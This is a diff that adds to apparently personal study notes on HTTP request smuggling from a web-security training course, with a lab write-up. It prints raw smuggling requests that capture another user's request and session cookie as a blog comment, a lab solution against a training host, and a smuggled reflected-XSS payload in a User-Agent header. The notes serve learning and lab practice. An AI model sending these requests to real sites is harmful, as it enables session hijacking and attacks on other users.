@@ -1209,11 +1209,95 @@ Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
 csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&comment=My+comment&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net
 ```
 
+Now consider what would happen if you smuggle an equivalent request with an overly long Content-Length header and the comment parameter positioned at the end of the request as follows:
+```bash
+GET / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 330
 
+0
+
+POST /post/comment HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 400
+Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
+
+csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
+```
+
+The Content-Length header of the smuggled request indicates that the body will be 400 bytes long, but we've only sent 144 bytes. In this case, the back-end server will wait for the remaining 256 bytes before issuing the response, or else issue a timeout if this doesn't arrive quick enough. As a result, when another request is sent to the back-end server down the same connection, the first 256 bytes are effectively appended to the smuggled request as follows:
+```bash
+POST /post/comment HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 400
+Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
+
+csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=GET / HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
+... 
+```
+As the start of the victim's request is contained in the comment parameter, this will be posted as a comment on the blog, enabling you to read it simply by visiting the relevant post.
+
+To capture more of the victim's request, you just need to increase the value of the smuggled request's Content-Length header accordingly, but note that this will involve a certain amount of trial and error. If you encounter a timeout, this probably means that the Content-Length you've specified is higher than the actual length of the victim's request. In this case, simply reduce the value until the attack works again. 
+
+> Note:
+>
+> One limitation with this technique is that it will generally only capture data up until the parameter delimiter that is applicable for the smuggled request. For URL-encoded form submissions, this will be the & character, meaning that the content that is stored from the victim user's request will end at the first &, which might even appear in the query string 
 
 ### PRACTITIONER Lab: Exploiting HTTP request smuggling to capture other users' requests
 First we figure out if it's CL.TE or TE.CL via timing technique and later via differential responses (just to confirm what timing technique found)
 Eventually we see that there is CL.TE
 
-To solve the lab we craft an attack request second part of which posts a comment on a page, but it does not post comment right away, it posts that comment as soon as the admin user makes a request to the server, and our poisoned backend server will actually post the admin's cookie and other request info as a blog comment
+To solve the lab we craft an attack request second part of which posts a comment on a page, but our smuggeled req does not post comment right away, it posts that comment as soon as the admin user makes a request to the server, and our poisoned backend server will actually post the admin's cookie and other request info as a blog comment
+
+The trickiest thing is to figure out the `Content-Length` of the smuggled (second part of our req) req because it must not be longer than the req of the victim user, otherwise we'll get timeouts
+
+So to solve the lab we send the following req:
+```bash
+POST / HTTP/1.1
+Host: 0a0200e004ff76a4802d80e700f80003.web-security-academy.net
+Transfer-Encoding: chunked
+Content-Length: 330
+
+0
+
+POST /post/comment HTTP/1.1
+Host: 0a0200e004ff76a4802d80e700f80003.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 770
+Cookie: session=nAkpyucPUGofhOyEDpeS71aJYlgMWsgC
+
+csrf=ZFnFy70zJnQ6p2QNAKAUMkqEEBIDsQ8L&postId=6&name=ff&email=ff%40ff.com&website=http%3A%2F%2Fff.com&comment=
+```
+
+Once a victim makes a req, their cookie is posted in a new comment
+
+### Using HTTP request smuggling to exploit reflected XSS
+If an application is vulnerable to HTTP request smuggling and also contains reflected XSS, you can use a request smuggling attack to hit other users of the application. This approach is superior to normal exploitation of reflected XSS in two ways:
+- It requires no interaction with victim users. You don't need to feed them a URL and wait for them to visit it. You just smuggle a request containing the XSS payload and the next user's request that is processed by the back-end server will be hit.
+- It can be used to exploit XSS behavior in parts of the request that cannot be trivially controlled in a normal reflected XSS attack, such as HTTP request headers.
+
+For example, suppose an application has a reflected XSS vulnerability in the User-Agent header. You can exploit this in a request smuggling attack as follows:
+```bash
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 63
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+User-Agent: <script>alert(1)</script>
+Foo: X
+```
+The next user's request will be appended to the smuggled request, and they will receive the reflected XSS payload in the response. 
+
+### PRACTITIONER Lab: Exploiting HTTP request smuggling to deliver reflected XSS
+TODO:
+
+### Using HTTP request smuggling to turn an on-site redirect into an open redirect
 
